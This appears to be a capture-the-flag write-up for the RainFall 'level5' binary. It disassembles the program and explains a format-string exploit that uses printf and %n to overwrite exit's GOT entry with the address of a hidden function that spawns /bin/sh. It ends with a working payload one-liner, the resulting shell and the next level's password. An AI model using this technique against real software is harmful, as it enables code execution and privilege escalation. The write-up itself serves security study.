
### notes
```c
0x08049854  m    : global variable m (useless here)
0x080484a4  o    : fn : called in n
0x080484c2  n    : fn : called in main
0x08048504  main : rak 3arf
```

### 0x080484c2 : n() : disassembly
- notebook: (to convert `hex` to `dec` and assign variable names for better reading)
```c

{
    char *buffer_1[512] = ebp-520
    // 0x218 ... 536
    // 0x208 ... 520
    // 0x200 ... 512
}
```
__`<0> -> <+3> : prepare stack frame for n function with size 536`__
```c
0x080484c2 <+0>:	push   ebp
0x080484c3 <+1>:	mov    ebp,esp
0x080484c5 <+3>:	sub    esp,536
```
__`<+9> -> <+35> : prepare arguments for fgets(str, size, stdin)`__
```c
0x080484cb <+9>:	mov    eax,ds:0x8049848 // stdin
0x080484d0 <+14>:	mov    DWORD PTR [esp+8],eax  
0x080484d4 <+18>:	mov    DWORD PTR [esp+4],512  
0x080484dc <+26>:	lea    eax,[buffer_1] 
0x080484e2 <+32>:	mov    DWORD PTR [esp],eax 
0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
fgets(str, 512, stdin)
```
__`<+40> -> <+49> : print the input from user taken by fgets`__
```c
0x080484ea <+40>:	lea    eax,[buffer_1]
0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
0x080484f3 <+49>:	call   0x8048380 <printf@plt>
printf(buffer_1)
```
__`<+54> -> <+61> : exit function with 1`__
```c
0x080484f8 <+54>:	mov    DWORD PTR [esp],1
0x080484ff <+61>:	call   0x80483d0 <exit@plt>
exit(1)
```



### 0x080484a4 : o() : disassembly
- notebook: (to convert `hex` to `dec` and assign variable names for better reading)
```c

{
    // 0x18 ...24
}
```
__`<+0> -> <+3> : init stack with size 24`__
```c
0x080484a4 <+0>:	push   ebp
0x080484a5 <+1>:	mov    ebp,esp
0x080484a7 <+3>:	sub    esp,24
```
__`<+6> -> <+13> : fork the shell with stystem call`__
```c
0x080484aa <+6>:	mov    DWORD PTR [esp],0x80485f0 // "/bin/sh"
0x080484b1 <+13>:	call   0x80483b0 <system@plt>
system("/bin/sh");
```
__`<+18> -> <+25> : exit function`__
```c
0x080484b6 <+18>:	mov    DWORD PTR [esp],1
0x080484bd <+25>:	call   0x8048390 <_exit@plt>
exit(1);
```

### Code Prediction 
```c
void o() {
    system("/bin/sh");
    exit(1);
}
void n() {

    char *buffer_1[512];

    fgets(str, 512, stdin);
    printf(buffer_1);

    exit(1);
}
int main(int argc(ebp+0x8), char **argv(ebp+12)) {
    n()
    return;
}
```
---

### Stack Illustration :
[![stack view](./Ressources/level5-stack-diagram.png)](./Ressources/level5-stack-diagram.png)

---
### Process of the Exploit

- since the function `o` that calls the shell is not called in `n` function nor the main
- the idea here is : find a a vulnerability to call `o` from `n`
- instead of exit the `n` we have to redirect it to execute the `o`

__how we will do that ?__ : 
- we have to overwrite the address where `<_exit@plt>` jumps (___global offset table___ __GOT__, search about it), to the address of `o` (_0x080484a4_)
ok lets start the process:

- looking at the assembly of exit function inside the n function
    ```c
    (gdb) disass 0x80483d0
    Dump of assembler code for function exit@plt:
    0x080483d0 <+0>:	jmp    DWORD PTR ds:0x8049838 <==== address to overwrite
    0x080483d6 <+6>:	push   0x28
    0x080483db <+11>:	jmp    0x8048370
    End of assembler dump.
    (gdb)
    ```
- the exit function jumps into `0x8049838` 
-we have to change the value the value of this address by the address of `o` ->`0x080484a4`
since we have only printf as a door to the exploit we will have to use the `%n` methode to write address into address

__what ?__
yes , simply we convert the address we want to change with to decimal 
in our case:
```
exit -> 0x8049838
o    -> 0x080484a4(hex) -> 134513828(decimal)
```
___
### Solution :
```shell
level5@RainFall:~$ (python -c 'print "\x08\x04\x98\x38"[::-1] + "%134513824d" + "%4$n"'; cat -) | ./level5

[...]


whoami
level6
pwd
/home/user/level5
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
---

### Ressources :

- ___[[VIDEO] : Format String Exploit and overwrite the Global Offset Table - bin 0x13](https://youtu.be/t1LH9D5cuK4)___
- ___[[ARTICLE] : A demonstration on how to overwrite GOT (Global Offset Table) table entry using format string vulnerability. ](https://gist.github.com/shahril96/e73268d41d493e056a5d2d768e5c634a)___
- ___[EXERCICE IN PROTOSTART](https://exploit.education/protostar/format-four/)___
- ___[[ARTICLE] : Exploiting format strings: Getting the shell](https://resources.infosecinstitute.com/topic/exploiting-format-strings-getting-the-shell/)___